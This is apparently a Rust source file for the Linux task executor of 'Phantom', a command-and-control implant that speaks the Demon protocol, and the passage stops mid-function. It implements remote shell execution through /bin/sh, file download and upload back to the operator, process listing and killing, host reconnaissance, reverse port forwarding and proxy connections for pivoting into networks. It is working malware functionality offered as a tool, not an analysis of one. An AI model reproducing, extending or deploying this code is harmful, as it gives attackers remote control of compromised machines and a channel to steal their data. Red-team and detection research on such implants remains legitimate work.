//! Linux task execution for the Phantom agent.

use std::collections::HashMap;
use std::ffi::OsString;
use std::fs;
use std::io::{ErrorKind, Read, Write};
use std::net::{Ipv4Addr, SocketAddrV4, TcpListener, TcpStream};
use std::path::{Path, PathBuf};
use std::process::Stdio;

use red_cell_common::demon::{
    DemonCommand, DemonFilesystemCommand, DemonNetCommand, DemonPackage, DemonProcessCommand,
    DemonSocketCommand, DemonSocketType,
};
use tokio::net::TcpStream as TokioTcpStream;
use tokio::process::Command;

use crate::error::PhantomError;
use crate::parser::TaskParser;
use crate::protocol::executable_name;

#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) enum PendingCallback {
    Output { request_id: u32, text: String },
    Error { request_id: u32, text: String },
    Exit { request_id: u32, exit_method: u32 },
    MemFileAck { request_id: u32, mem_file_id: u32, success: bool },
    FsUpload { request_id: u32, file_size: u32, path: String },
    Socket { request_id: u32, payload: Vec<u8> },
}

#[derive(Debug, Default)]
pub(crate) struct PhantomState {
    mem_files: HashMap<u32, MemFile>,
    reverse_port_forwards: HashMap<u32, ReversePortForward>,
    sockets: HashMap<u32, ManagedSocket>,
    pending_callbacks: Vec<PendingCallback>,
}

#[derive(Debug)]
struct MemFile {
    expected_size: usize,
    data: Vec<u8>,
}

#[derive(Debug)]
struct ReversePortForward {
    listener: TcpListener,
    bind_addr: u32,
    bind_port: u32,
    forward_addr: u32,
    forward_port: u32,
}

#[derive(Debug)]
struct ManagedSocket {
    stream: TcpStream,
    socket_type: DemonSocketType,
    bind_addr: u32,
    bind_port: u32,
    forward_addr: u32,
    forward_port: u32,
}

impl PhantomState {
    pub(crate) async fn poll(&mut self) -> Result<(), PhantomError> {
        self.accept_reverse_port_forward_clients()?;
        self.poll_sockets().await
    }

    pub(crate) fn drain_callbacks(&mut self) -> Vec<PendingCallback> {
        std::mem::take(&mut self.pending_callbacks)
    }

    fn queue_callback(&mut self, callback: PendingCallback) {
        self.pending_callbacks.push(callback);
    }

    fn accept_reverse_port_forward_clients(&mut self) -> Result<(), PhantomError> {
        let listener_ids = self.reverse_port_forwards.keys().copied().collect::<Vec<_>>();
        let mut accepted = Vec::new();

        for listener_id in listener_ids {
            let Some(listener) = self.reverse_port_forwards.get(&listener_id) else {
                continue;
            };

            loop {
                match listener.listener.accept() {
                    Ok((stream, _peer)) => {
                        stream
                            .set_nonblocking(true)
                            .map_err(|error| PhantomError::Socket(error.to_string()))?;
                        accepted.push((
                            listener_id,
                            listener.bind_addr,
                            listener.bind_port,
                            listener.forward_addr,
                            listener.forward_port,
                            stream,
                        ));
                    }
                    Err(error) if error.kind() == ErrorKind::WouldBlock => break,
                    Err(error) => {
                        return Err(PhantomError::Socket(error.to_string()));
                    }
                }
            }
        }

        for (listener_id, bind_addr, bind_port, forward_addr, forward_port, stream) in accepted {
            let socket_id = self.allocate_socket_id();
            self.sockets.insert(
                socket_id,
                ManagedSocket {
                    stream,
                    socket_type: DemonSocketType::Client,
                    bind_addr,
                    bind_port,
                    forward_addr,
                    forward_port,
                },
            );
            self.queue_callback(PendingCallback::Socket {
                request_id: 0,
                payload: encode_socket_open(
                    socket_id,
                    bind_addr,
                    bind_port,
                    forward_addr,
                    forward_port,
                ),
            });

            if !self.reverse_port_forwards.contains_key(&listener_id) {
                self.remove_socket(socket_id);
            }
        }

        Ok(())
    }

    async fn poll_sockets(&mut self) -> Result<(), PhantomError> {
        let socket_ids = self.sockets.keys().copied().collect::<Vec<_>>();
        let mut removals = Vec::new();

        for socket_id in socket_ids {
            let mut read_failure = None;
            let mut read_success = None;

            {
                let Some(socket) = self.sockets.get_mut(&socket_id) else {
                    continue;
                };

                let mut data = Vec::new();
                let mut buffer = [0_u8; 4096];

                loop {
                    match socket.stream.read(&mut buffer) {
                        Ok(0) => {
                            removals.push(socket_id);
                            break;
                        }
                        Ok(read) => data.extend_from_slice(&buffer[..read]),
                        Err(error) if error.kind() == ErrorKind::WouldBlock => break,
                        Err(error) => {
                            read_failure = Some(PendingCallback::Socket {
                                request_id: 0,
                                payload: encode_socket_read_failure(
                                    socket_id,
                                    socket.socket_type,
                                    raw_socket_error(&error),
                                ),
                            });
                            removals.push(socket_id);
                            break;
                        }
                    }
                }

                if !data.is_empty() {
                    read_success = Some(PendingCallback::Socket {
                        request_id: 0,
                        payload: encode_socket_read_success(socket_id, socket.socket_type, &data)?,
                    });
                }
            }

            if let Some(callback) = read_failure {
                self.queue_callback(callback);
            }
            if let Some(callback) = read_success {
                self.queue_callback(callback);
            }
        }

        for socket_id in removals {
            self.remove_socket(socket_id);
        }

        Ok(())
    }

    fn allocate_socket_id(&self) -> u32 {
        let mut socket_id = rand::random::<u32>() | 1;
        while self.sockets.contains_key(&socket_id)
            || self.reverse_port_forwards.contains_key(&socket_id)
        {
            socket_id = rand::random::<u32>() | 1;
        }
        socket_id
    }

    fn remove_socket(&mut self, socket_id: u32) {
        let Some(socket) = self.sockets.remove(&socket_id) else {
            return;
        };

        let payload = match socket.socket_type {
            DemonSocketType::Client | DemonSocketType::ReversePortForward => {
                encode_rportfwd_remove(
                    socket_id,
                    socket.socket_type,
                    socket.bind_addr,
                    socket.bind_port,
                    socket.forward_addr,
                    socket.forward_port,
                )
            }
            DemonSocketType::ReverseProxy => {
                encode_socket_close(socket_id, DemonSocketType::ReverseProxy)
            }
        };

        self.queue_callback(PendingCallback::Socket { request_id: 0, payload });
    }
}

impl MemFile {
    fn append(&mut self, data: &[u8]) {
        self.data.extend_from_slice(data);
        if self.data.len() > self.expected_size {
            self.data.truncate(self.expected_size);
        }
    }

    fn is_complete(&self) -> bool {
        self.data.len() == self.expected_size
    }
}

/// Execute a single Demon task package.
pub(crate) async fn execute(
    package: &DemonPackage,
    state: &mut PhantomState,
) -> Result<(), PhantomError> {
    match package.command()? {
        DemonCommand::CommandNoJob => {}
        DemonCommand::CommandSleep => {
            let mut parser = TaskParser::new(&package.payload);
            let sleep_ms = parser.int32()?;
            state.queue_callback(PendingCallback::Output {
                request_id: package.request_id,
                text: format!("sleep updated to {sleep_ms} ms"),
            });
        }
        DemonCommand::CommandFs => {
            execute_filesystem(package.request_id, &package.payload, state).await?;
        }
        DemonCommand::CommandProcList => {
            let text = execute_process_list(&package.payload)?;
            state.queue_callback(PendingCallback::Output { request_id: package.request_id, text });
        }
        DemonCommand::CommandProc => {
            execute_process(package.request_id, &package.payload, state).await?;
        }
        DemonCommand::CommandNet => {
            execute_network(package.request_id, &package.payload, state)?;
        }
        DemonCommand::CommandSocket => {
            execute_socket(package.request_id, &package.payload, state).await?;
        }
        DemonCommand::CommandMemFile => {
            execute_memfile(package.request_id, &package.payload, state)?;
        }
        DemonCommand::CommandExit => {
            let mut parser = TaskParser::new(&package.payload);
            let exit_method = u32::try_from(parser.int32()?)
                .map_err(|_| PhantomError::TaskParse("negative exit method"))?;
            state.queue_callback(PendingCallback::Exit {
                request_id: package.request_id,
                exit_method,
            });
        }
        command => {
            state.queue_callback(PendingCallback::Error {
                request_id: package.request_id,
                text: format!("phantom does not implement command {command:?} yet"),
            });
        }
    }

    Ok(())
}

async fn execute_filesystem(
    request_id: u32,
    payload: &[u8],
    state: &mut PhantomState,
) -> Result<(), PhantomError> {
    let mut parser = TaskParser::new(payload);
    let subcommand = u32::try_from(parser.int32()?)
        .map_err(|_| PhantomError::TaskParse("negative filesystem subcommand"))?;
    let subcommand = DemonFilesystemCommand::try_from(subcommand)?;

    match subcommand {
        DemonFilesystemCommand::Dir => {
            let _file_explorer = parser.bool32()?;
            let target = normalize_path(&parser.wstring()?);
            let _subdirs = parser.bool32()?;
            let files_only = parser.bool32()?;
            let dirs_only = parser.bool32()?;
            let _list_only = parser.bool32()?;
            let _starts = parser.wstring()?;
            let _contains = parser.wstring()?;
            let _ends = parser.wstring()?;

            let entries = fs::read_dir(&target).map_err(|error| io_error(&target, error))?;
            let mut output = Vec::new();
            for entry in entries {
                let entry = entry.map_err(|error| io_error(&target, error))?;
                let metadata = entry.metadata().map_err(|error| io_error(entry.path(), error))?;
                if files_only && metadata.is_dir() {
                    continue;
                }
                if dirs_only && metadata.is_file() {
                    continue;
                }
                let kind = if metadata.is_dir() { "dir" } else { "file" };
                output.push(format!("{kind}\t{}", entry.path().display()));
            }
            state.queue_callback(PendingCallback::Output { request_id, text: output.join("\n") });
        }
        DemonFilesystemCommand::Download | DemonFilesystemCommand::Cat => {
            let path = normalize_path(&parser.wstring()?);
            let contents = fs::read(&path).map_err(|error| io_error(&path, error))?;
            state.queue_callback(PendingCallback::Output {
                request_id,
                text: String::from_utf8_lossy(&contents).into_owned(),
            });
        }
        DemonFilesystemCommand::Upload => {
            let path = normalize_path(&parser.wstring()?);
            let mem_file_id = u32::try_from(parser.int32()?)
                .map_err(|_| PhantomError::TaskParse("negative memfile id"))?;
            let Some(mem_file) = state.mem_files.get(&mem_file_id) else {
                state.queue_callback(PendingCallback::Error {
                    request_id,
                    text: format!("memfile {mem_file_id:#x} was not found"),
                });
                return Ok(());
            };
            if !mem_file.is_complete() {
                state.queue_callback(PendingCallback::Error {
                    request_id,
                    text: format!("memfile {mem_file_id:#x} is incomplete"),
                });
                return Ok(());
            }

            fs::write(&path, &mem_file.data).map_err(|error| io_error(&path, error))?;
            let file_size = u32::try_from(mem_file.data.len())
                .map_err(|_| PhantomError::InvalidResponse("uploaded file too large"))?;
            state.queue_callback(PendingCallback::FsUpload {
                request_id,
                file_size,
                path: path.display().to_string(),
            });
            state.mem_files.remove(&mem_file_id);
        }
        DemonFilesystemCommand::Cd => {
            let path = normalize_path(&parser.wstring()?);
            std::env::set_current_dir(&path).map_err(|error| io_error(&path, error))?;
            state.queue_callback(PendingCallback::Output {
                request_id,
                text: path.display().to_string(),
            });
        }
        DemonFilesystemCommand::Remove => {
            let path = normalize_path(&parser.wstring()?);
            if path.is_dir() {
                fs::remove_dir(&path).map_err(|error| io_error(&path, error))?;
            } else {
                fs::remove_file(&path).map_err(|error| io_error(&path, error))?;
            }
            state.queue_callback(PendingCallback::Output {
                request_id,
                text: path.display().to_string(),
            });
        }
        DemonFilesystemCommand::Mkdir => {
            let path = normalize_path(&parser.wstring()?);
            fs::create_dir_all(&path).map_err(|error| io_error(&path, error))?;
            state.queue_callback(PendingCallback::Output {
                request_id,
                text: path.display().to_string(),
            });
        }
        DemonFilesystemCommand::Copy => {
            let from = normalize_path(&parser.wstring()?);
            let to = normalize_path(&parser.wstring()?);
            fs::copy(&from, &to).map_err(|error| io_error(&from, error))?;
            state.queue_callback(PendingCallback::Output {
                request_id,
                text: format!("{} -> {}", from.display(), to.display()),
            });
        }
        DemonFilesystemCommand::Move => {
            let from = normalize_path(&parser.wstring()?);
            let to = normalize_path(&parser.wstring()?);
            fs::rename(&from, &to).map_err(|error| io_error(&from, error))?;
            state.queue_callback(PendingCallback::Output {
                request_id,
                text: format!("{} -> {}", from.display(), to.display()),
            });
        }
        DemonFilesystemCommand::GetPwd => {
            let path = std::env::current_dir()
                .map_err(|error| PhantomError::Process(error.to_string()))?;
            state.queue_callback(PendingCallback::Output {
                request_id,
                text: path.display().to_string(),
            });
        }
    }

    Ok(())
}

fn execute_process_list(payload: &[u8]) -> Result<String, PhantomError> {
    let mut parser = TaskParser::new(payload);
    let _process_ui = parser.int32()?;

    let mut lines = Vec::new();
    for entry in fs::read_dir("/proc").map_err(|error| io_error("/proc", error))? {
        let entry = entry.map_err(|error| io_error("/proc", error))?;
        let file_name = entry.file_name();
        let Some(pid) = file_name.to_str().and_then(|value| value.parse::<u32>().ok()) else {
            continue;
        };
        let exe = fs::read_link(entry.path().join("exe")).unwrap_or_else(|_| PathBuf::from("?"));
        lines.push(format!("{pid}\t{}", executable_name(&exe)));
    }

    lines.sort();
    Ok(lines.join("\n"))
}

async fn execute_process(
    request_id: u32,
    payload: &[u8],
    state: &mut PhantomState,
) -> Result<(), PhantomError> {
    let mut parser = TaskParser::new(payload);
    let subcommand = u32::try_from(parser.int32()?)
        .map_err(|_| PhantomError::TaskParse("negative process subcommand"))?;
    let subcommand = DemonProcessCommand::try_from(subcommand)?;

    match subcommand {
        DemonProcessCommand::Create => {
            let _process_state = parser.int32()?;
            let process = parser.wstring()?;
            let process_args = parser.wstring()?;
            let piped = parser.bool32()?;
            let _verbose = parser.bool32()?;

            let binary = if process.is_empty() { String::from("/bin/sh") } else { process };

            let mut command = Command::new(&binary);
            if process_args.is_empty() {
                if binary == "/bin/sh" {
                    command.arg("-c").arg("true");
                }
            } else if binary == "/bin/sh" {
                command.arg("-c").arg(process_args);
            } else {
                command.args(split_args(&process_args));
            }
            if piped {
                command.stdout(Stdio::piped()).stderr(Stdio::piped());
                let output = command
                    .output()
                    .await
                    .map_err(|error| PhantomError::Process(error.to_string()))?;
                let mut merged = String::from_utf8_lossy(&output.stdout).into_owned();
                if !output.stderr.is_empty() {
                    if !merged.is_empty() {
                        merged.push('\n');
                    }
                    merged.push_str(&String::from_utf8_lossy(&output.stderr));
                }
                state.queue_callback(PendingCallback::Output { request_id, text: merged });
            } else {
                let child =
                    command.spawn().map_err(|error| PhantomError::Process(error.to_string()))?;
                state.queue_callback(PendingCallback::Output {
                    request_id,
                    text: format!("spawned {} with pid {}", binary, child.id().unwrap_or_default()),
                });
            }
        }
        DemonProcessCommand::Kill => {
            let pid = u32::try_from(parser.int32()?)
                .map_err(|_| PhantomError::TaskParse("negative pid"))?;
            Command::new("kill")
                .arg("-9")
                .arg(pid.to_string())
                .status()
                .await
                .map_err(|error| PhantomError::Process(error.to_string()))?;
            state.queue_callback(PendingCallback::Output {
                request_id,
                text: format!("terminated pid {pid}"),
            });
        }
        DemonProcessCommand::Grep => {
            let needle = parser.wstring()?.to_lowercase();
            let filtered = execute_process_list(&0_i32.to_le_bytes())?
                .lines()
                .filter(|line| line.to_lowercase().contains(&needle))
                .collect::<Vec<_>>()
                .join("\n");
            state.queue_callback(PendingCallback::Output { request_id, text: filtered });
        }
        DemonProcessCommand::Modules => {
            let pid = u32::try_from(parser.int32().unwrap_or_default()).unwrap_or_default();
            let maps =
                if pid == 0 { "/proc/self/maps".to_string() } else { format!("/proc/{pid}/maps") };
            let contents = fs::read_to_string(&maps).map_err(|error| io_error(&maps, error))?;
            state.queue_callback(PendingCallback::Output { request_id, text: contents });
        }
        DemonProcessCommand::Memory => {
            let pid = parser.int32()?;
            let _query_protection = parser.int32()?;
            state.queue_callback(PendingCallback::Error {
                request_id,
                text: format!(
                    "process memory enumeration for pid {pid} is not implemented in Phantom yet"
                ),
            });
        }
    }

    Ok(())
}

fn execute_network(
    request_id: u32,
    payload: &[u8],
    state: &mut PhantomState,
) -> Result<(), PhantomError> {
    let mut parser = TaskParser::new(payload);
    let subcommand = u32::try_from(parser.int32()?)
        .map_err(|_| PhantomError::TaskParse("negative network subcommand"))?;
    let subcommand = DemonNetCommand::try_from(subcommand)?;

    match subcommand {
        DemonNetCommand::Domain => state.queue_callback(PendingCallback::Output {
            request_id,
            text: fs::read_to_string("/etc/resolv.conf")
                .ok()
                .and_then(|contents| {
                    contents.lines().find_map(|line| {
                        let trimmed = line.trim();
                        trimmed
                            .strip_prefix("search ")
                            .or_else(|| trimmed.strip_prefix("domain "))
                            .map(|value| value.trim().to_string())
                    })
                })
                .unwrap_or_else(|| String::from("WORKGROUP")),
        }),
        DemonNetCommand::Computer => state.queue_callback(PendingCallback::Output {
            request_id,
            text: fs::read_to_string("/etc/hostname")
                .unwrap_or_else(|_| String::from("unknown"))
                .trim()
                .to_string(),
        }),
        DemonNetCommand::Logons
        | DemonNetCommand::Sessions
        | DemonNetCommand::DcList
        | DemonNetCommand::Share
        | DemonNetCommand::LocalGroup
        | DemonNetCommand::Group
        | DemonNetCommand::Users => state.queue_callback(PendingCallback::Error {
            request_id,
            text: format!("network subcommand {subcommand:?} is not implemented in Phantom yet"),
        }),
    }

    Ok(())
}

async fn execute_socket(
    request_id: u32,
    payload: &[u8],
    state: &mut PhantomState,
) -> Result<(), PhantomError> {
    let mut parser = TaskParser::new(payload);
    let subcommand = u32::try_from(parser.int32()?)
        .map_err(|_| PhantomError::TaskParse("negative socket subcommand"))?;
    let subcommand = DemonSocketCommand::try_from(subcommand)?;

    match subcommand {
        DemonSocketCommand::ReversePortForwardAdd => {
            let bind_addr = u32::try_from(parser.int32()?).map_err(|_| {
                PhantomError::TaskParse("negative reverse port-forward bind address")
            })?;
            let bind_port = u32::try_from(parser.int32()?)
                .map_err(|_| PhantomError::TaskParse("negative reverse port-forward bind port"))?;
            let forward_addr = u32::try_from(parser.int32()?).map_err(|_| {
                PhantomError::TaskParse("negative reverse port-forward forward address")
            })?;
            let forward_port = u32::try_from(parser.int32()?).map_err(|_| {
                PhantomError::TaskParse("negative reverse port-forward forward port")
            })?;

            let listener_id = state.allocate_socket_id();
            let bind_socket = SocketAddrV4::new(Ipv4Addr::from(bind_addr), bind_port as u16);
            match TcpListener::bind(bind_socket) {
                Ok(listener) => {
                    listener
                        .set_nonblocking(true)
                        .map_err(|error| PhantomError::Socket(error.to_string()))?;
                    state.reverse_port_forwards.insert(
                        listener_id,
                        ReversePortForward {
                            listener,
                            bind_addr,
                            bind_port,
                            forward_addr,
                            forward_port,
                        },
                    );
                    state.queue_callback(PendingCallback::Socket {
                        request_id,
                        payload: encode_rportfwd_add(
                            true,
                            listener_id,
                            bind_addr,
                            bind_port,
                            forward_addr,
                            forward_port,
                        ),
                    });
                }
                Err(_error) => {
                    state.queue_callback(PendingCallback::Socket {
                        request_id,
                        payload: encode_rportfwd_add(
                            false,
                            0,
                            bind_addr,
                            bind_port,
                            forward_addr,
                            forward_port,
                        ),
                    });
                }
            }
        }
        DemonSocketCommand::ReversePortForwardAddLocal => {
            state.queue_callback(PendingCallback::Error {
                request_id,
                text: String::from("reverse-port-forward add-local is not implemented in Phantom"),
            });
        }
        DemonSocketCommand::ReversePortForwardList => {
            let mut payload = encode_u32(u32::from(DemonSocketCommand::ReversePortForwardList));
            for (socket_id, listener) in &state.reverse_port_forwards {
                payload.extend_from_slice(&encode_u32(*socket_id));
                payload.extend_from_slice(&encode_u32(listener.bind_addr));
                payload.extend_from_slice(&encode_u32(listener.bind_port));
                payload.extend_from_slice(&encode_u32(listener.forward_addr));
                payload.extend_from_slice(&encode_u32(listener.forward_port));
            }
            state.queue_callback(PendingCallback::Socket { request_id, payload });
        }
        DemonSocketCommand::ReversePortForwardClear => {
            state.reverse_port_forwards.clear();
            let client_ids = state
                .sockets
                .iter()
                .filter_map(|(socket_id, socket)| {
                    (socket.socket_type == DemonSocketType::Client).then_some(*socket_id)
                })
                .collect::<Vec<_>>();
            for client_id in client_ids {
                state.remove_socket(client_id);
            }
            state.queue_callback(PendingCallback::Socket {
                request_id,
                payload: encode_socket_clear(true),
            });
        }
        DemonSocketCommand::ReversePortForwardRemove => {
            let socket_id = u32::try_from(parser.int32()?)
                .map_err(|_| PhantomError::TaskParse("negative reverse port-forward socket id"))?;
            if let Some(listener) = state.reverse_port_forwards.remove(&socket_id) {
                let client_ids = state
                    .sockets
                    .iter()
                    .filter_map(|(client_id, socket)| {
                        (socket.socket_type == DemonSocketType::Client
                            && socket.bind_addr == listener.bind_addr
                            && socket.bind_port == listener.bind_port
                            && socket.forward_addr == listener.forward_addr
                            && socket.forward_port == listener.forward_port)
                            .then_some(*client_id)
                    })
                    .collect::<Vec<_>>();
                for client_id in client_ids {
                    state.remove_socket(client_id);
                }
                state.queue_callback(PendingCallback::Socket {
                    request_id,
                    payload: encode_rportfwd_remove(
                        socket_id,
                        DemonSocketType::ReversePortForward,
                        listener.bind_addr,
                        listener.bind_port,
                        listener.forward_addr,
                        listener.forward_port,
                    ),
                });
            }
        }
        DemonSocketCommand::SocksProxyAdd
        | DemonSocketCommand::SocksProxyList
        | DemonSocketCommand::SocksProxyRemove
        | DemonSocketCommand::SocksProxyClear => {
            state.queue_callback(PendingCallback::Error {
                request_id,
                text: format!("socket subcommand {subcommand:?} is not implemented in Phantom"),
            });
        }
        DemonSocketCommand::Open => {
            state.queue_callback(PendingCallback::Error {
                request_id,
                text: String::from("socket open is a callback-only path in Phantom"),
            });
        }
        DemonSocketCommand::Read => {
            let socket_id = u32::try_from(parser.int32()?)
                .map_err(|_| PhantomError::TaskParse("negative socket id"))?;
            let socket_type = u32::try_from(parser.int32()?)
                .map_err(|_| PhantomError::TaskParse("negative socket type"))?;
            let socket_type = DemonSocketType::try_from(socket_type)?;
            let success = parser.bool32()?;

            if success {
                let data = parser.bytes()?;
                write_to_socket(request_id, state, socket_id, socket_type, data)?;
            } else {
                let error_code = u32::try_from(parser.int32()?)
                    .map_err(|_| PhantomError::TaskParse("negative socket error code"))?;
                state.queue_callback(PendingCallback::Error {
                    request_id,
                    text: format!("socket {socket_id:#x} read failed with error {error_code}"),
                });
            }
        }
        DemonSocketCommand::Write => {
            let socket_id = u32::try_from(parser.int32()?)
                .map_err(|_| PhantomError::TaskParse("negative socket id"))?;
            let data = parser.bytes()?;
            let mut write_failure = None;
            if let Some(socket) = state.sockets.get_mut(&socket_id) {
                if let Err(error) = write_all_nonblocking(&mut socket.stream, data) {
                    write_failure = Some(PendingCallback::Socket {
                        request_id,
                        payload: encode_socket_write_failure(
                            socket_id,
                            socket.socket_type,
                            raw_socket_error(&error),
                        ),
                    });
                }
            }
            if let Some(callback) = write_failure {
                state.queue_callback(callback);
                state.remove_socket(socket_id);
            }
        }
        DemonSocketCommand::Close => {
            let socket_id = u32::try_from(parser.int32()?)
                .map_err(|_| PhantomError::TaskParse("negative socket id"))?;
            state.remove_socket(socket_id);
        }
        DemonSocketCommand::Connect => {
            let socket_id = u32::try_from(parser.int32()?)
                .map_err(|_| PhantomError::TaskParse("negative socket id"))?;
            let atyp = parser.byte()?;
            let host = parser.bytes()?;
            let port = u16::from_ne_bytes(parser.int16()?.to_ne_bytes());

            let connection = connect_socks_target(atyp, host, port).await;
            match connection {
                Ok(stream) => {
                    state.sockets.insert(
                        socket_id,
                        ManagedSocket {
                            stream,
                            socket_type: DemonSocketType::ReverseProxy,
                            bind_addr: 0,
                            bind_port: u32::from(port),
                            forward_addr: 0,
                            forward_port: 0,
                        },
                    );
                    state.queue_callback(PendingCallback::Socket {
                        request_id,
                        payload: encode_socket_connect(true, socket_id, 0),
                    });
                }
                Err(error_code) => {
                    state.queue_callback(PendingCallback::Socket {
                        request_id,
                        payload: encode_socket_connect(false, socket_id, error_code),
                    });
                }
            }
        }
    }

    Ok(())
}

fn execute_memfile(
    request_id: u32,
    payload: &[u8],
    state: &mut PhantomState,
) -> Result<(), PhantomError> {
    let mut parser = TaskParser::new(payload);
    let mem_file_id = u32::try_from(parser.int32()?)
        .map_err(|_| PhantomError::TaskParse("negative memfile id"))?;
    let total_size = usize::try_from(parser.int64()?)
        .map_err(|_| PhantomError::TaskParse("negative memfile size"))?;
    let chunk = parser.bytes()?;

    let entry = state.mem_files.entry(mem_file_id).or_insert_with(|| MemFile {
        expected_size: total_size,
        data: Vec::with_capacity(total_size),
    });

    if entry.expected_size != total_size || entry.data.len() > total_size {
        state.queue_callback(PendingCallback::MemFileAck {
            request_id,
            mem_file_id,
            success: false,
        });
        return Ok(());
    }

    entry.append(chunk);
    state.queue_callback(PendingCallback::MemFileAck { request_id, mem_file_id, success: true });

    Ok(())
}

fn write_to_socket(
    request_id: u32,
    state: &mut PhantomState,
    socket_id: u32,
    expected_type: DemonSocketType,
    data: &[u8],
) -> Result<(), PhantomError> {
    let Some(socket) = state.sockets.get_mut(&socket_id) else {
        state.queue_callback(PendingCallback::Error {
            request_id,
            text: format!("socket {socket_id:#x} was not found"),
        });
        return Ok(());
    };

    let socket_type = socket.socket_type;
    if socket_type != expected_type {
        let actual_type = socket_type;
        let _ = socket;
        state.queue_callback(PendingCallback::Error {
            request_id,
            text: format!(
                "socket {socket_id:#x} has type {:?}, expected {:?}",
                actual_type, expected_type
            ),
        });
        return Ok(());
    }

    if let Err(error) = write_all_nonblocking(&mut socket.stream, data) {
        let _ = socket;
        state.queue_callback(PendingCallback::Socket {
            request_id,
            payload: encode_socket_write_failure(socket_id, socket_type, raw_socket_error(&error)),
        });
        state.remove_socket(socket_id);
    }

    Ok(())
}

async fn connect_socks_target(atyp: u8, host: &[u8], port: u16) -> Result<TcpStream, u32> {
    let target = match atyp {
        1 if host.len() == 4 => format!("{}.{}.{}.{}:{port}", host[0], host[1], host[2], host[3]),
        3 => {
            let hostname = String::from_utf8(host.to_vec()).map_err(|_| 1_u32)?;
            format!("{hostname}:{port}")
        }
        4 if host.len() == 16 => {
            let segments = host
                .chunks_exact(2)
                .map(|chunk| u16::from_be_bytes([chunk[0], chunk[1]]))
                .collect::<Vec<_>>();
            format!(
                "{:x}:{:x}:{:x}:{:x}:{:x}:{:x}:{:x}:{:x}:{port}",
                segments[0],
                segments[1],
                segments[2],
                segments[3],
                segments[4],
                segments[5],
                segments[6],
                segments[7],
            )
        }
        _ => return Err(1),
    };

    let stream =
        TokioTcpStream::connect(&target).await.map_err(|error| raw_socket_error(&error))?;
    let stream = stream.into_std().map_err(|error| raw_socket_error(&error))?;
    stream.set_nonblocking(true).map_err(|error| raw_socket_error(&error))?;
    Ok(stream)
}

fn write_all_nonblocking(stream: &mut TcpStream, mut data: &[u8]) -> std::io::Result<()> {
    while !data.is_empty() {
        match stream.write(data) {
            Ok(0) => return Err(std::io::Error::new(ErrorKind::WriteZero, "socket closed")),
            Ok(written) => data = &data[written..],
            Err(error) if error.kind() == ErrorKind::Interrupted => continue,
            Err(error) => return Err(error),
        }
    }

    Ok(())
}

fn raw_socket_error(error: &std::io::Error) -> u32 {
    error.raw_os_error().and_then(|code| u32::try_from(code).ok()).unwrap_or(1)
}

fn normalize_path(value: &str) -> PathBuf {
    if value.is_empty() || value == "." {
        std::env::current_dir().unwrap_or_else(|_| PathBuf::from("."))
    } else {
        PathBuf::from(value)
    }
}

fn io_error(path: impl AsRef<Path>, error: std::io::Error) -> PhantomError {
    PhantomError::Io { path: path.as_ref().to_path_buf(), message: error.to_string() }
}

fn split_args(arguments: &str) -> Vec<OsString> {
    arguments.split_whitespace().filter(|value| !value.is_empty()).map(OsString::from).collect()
}

fn encode_u32(value: u32) -> Vec<u8> {
    value.to_be_bytes().to_vec()
}

fn encode_bool(value: bool) -> Vec<u8> {
    encode_u32(u32::from(value))
}

fn encode_bytes(value: &[u8]) -> Result<Vec<u8>, PhantomError> {
    let len = u32::try_from(value.len())
        .map_err(|_| PhantomError::InvalidResponse("socket payload too large"))?;
    let mut out = Vec::with_capacity(4 + value.len());
    out.extend_from_slice(&len.to_be_bytes());
    out.extend_from_slice(value);
    Ok(out)
}

fn encode_utf16(value: &str) -> Result<Vec<u8>, PhantomError> {
    let encoded = value.encode_utf16().flat_map(u16::to_le_bytes).collect::<Vec<_>>();
    encode_bytes(&encoded)
}

fn encode_rportfwd_add(
    success: bool,
    socket_id: u32,
    bind_addr: u32,
    bind_port: u32,
    forward_addr: u32,
    forward_port: u32,
) -> Vec<u8> {
    let mut payload = encode_u32(u32::from(DemonSocketCommand::ReversePortForwardAdd));
    payload.extend_from_slice(&encode_bool(success));
    payload.extend_from_slice(&encode_u32(socket_id));
    payload.extend_from_slice(&encode_u32(bind_addr));
    payload.extend_from_slice(&encode_u32(bind_port));
    payload.extend_from_slice(&encode_u32(forward_addr));
    payload.extend_from_slice(&encode_u32(forward_port));
    payload
}

fn encode_socket_open(
    socket_id: u32,
    bind_addr: u32,
    bind_port: u32,
    forward_addr: u32,
    forward_port: u32,
) -> Vec<u8> {
    let mut payload = encode_u32(u32::from(DemonSocketCommand::Open));
    payload.extend_from_slice(&encode_u32(socket_id));
    payload.extend_from_slice(&encode_u32(bind_addr));
    payload.extend_from_slice(&encode_u32(bind_port));
    payload.extend_from_slice(&encode_u32(forward_addr));
    payload.extend_from_slice(&encode_u32(forward_port));
    payload
}

fn encode_socket_read_success(
    socket_id: u32,
    socket_type: DemonSocketType,
    data: &[u8],
) -> Result<Vec<u8>, PhantomError> {
    let mut payload = encode_u32(u32::from(DemonSocketCommand::Read));
    payload.extend_from_slice(&encode_u32(socket_id));
    payload.extend_from_slice(&encode_u32(u32::from(socket_type)));
    payload.extend_from_slice(&encode_bool(true));
    payload.extend_from_slice(&encode_bytes(data)?);
    Ok(payload)
}

fn encode_socket_read_failure(
    socket_id: u32,
    socket_type: DemonSocketType,
    error_code: u32,
) -> Vec<u8> {
    let mut payload = encode_u32(u32::from(DemonSocketCommand::Read));
    payload.extend_from_slice(&encode_u32(socket_id));
    payload.extend_from_slice(&encode_u32(u32::from(socket_type)));
    payload.extend_from_slice(&encode_bool(false));
    payload.extend_from_slice(&encode_u32(error_code));
    payload
}

fn encode_socket_write_failure(
    socket_id: u32,
    socket_type: DemonSocketType,
    error_code: u32,
) -> Vec<u8> {
    let mut payload = encode_u32(u32::from(DemonSocketCommand::Write));
    payload.extend_from_slice(&encode_u32(socket_id));
    payload.extend_from_slice(&encode_u32(u32::from(socket_type)));
    payload.extend_from_slice(&encode_bool(false));
    payload.extend_from_slice(&encode_u32(error_code));
    payload
}

fn encode_socket_close(socket_id: u32, socket_type: DemonSocketType) -> Vec<u8> {
    let mut payload = encode_u32(u32::from(DemonSocketCommand::Close));
    payload.extend_from_slice(&encode_u32(socket_id));
    payload.extend_from_slice(&encode_u32(u32::from(socket_type)));
    payload
}

fn encode_socket_connect(success: bool, socket_id: u32, error_code: u32) -> Vec<u8> {
    let mut payload = encode_u32(u32::from(DemonSocketCommand::Connect));
    payload.extend_from_slice(&encode_bool(success));
    payload.extend_from_slice(&encode_u32(socket_id));
    payload.extend_from_slice(&encode_u32(error_code));
    payload
}

fn encode_rportfwd_remove(
    socket_id: u32,
    socket_type: DemonSocketType,
    bind_addr: u32,
    bind_port: u32,
